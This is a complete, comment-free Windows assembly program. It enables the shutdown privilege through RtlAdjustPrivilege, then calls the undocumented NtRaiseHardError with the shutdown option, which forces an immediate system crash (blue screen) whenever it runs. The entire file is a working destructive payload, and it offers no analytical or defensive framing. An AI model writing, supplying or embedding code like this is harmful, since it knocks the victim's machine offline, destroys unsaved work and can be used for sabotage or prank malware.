.386
.model flat, stdcall
option casemap: none

include <windows.inc>
include <ntdll.inc>
includelib <ntdll.lib>

false = 0
true  = 1

nullptr = 0

OptionShutdownSystem = 6
SeShutdownPrivilege  = 19

.data?
   res1 byte ?
   res2 dword ?

.code
main:
   invoke RtlAdjustPrivilege \
   , SeShutdownPrivilege     \
   , true                    \
   , false                   \
   , offset res1

   invoke NtRaiseHardError        \
   , STATUS_FLOAT_MULTIPLE_FAULTS \
   , 0                            \
   , nullptr                      \
   , nullptr                      \
   , OptionShutdownSystem         \
   , offset res2
end main

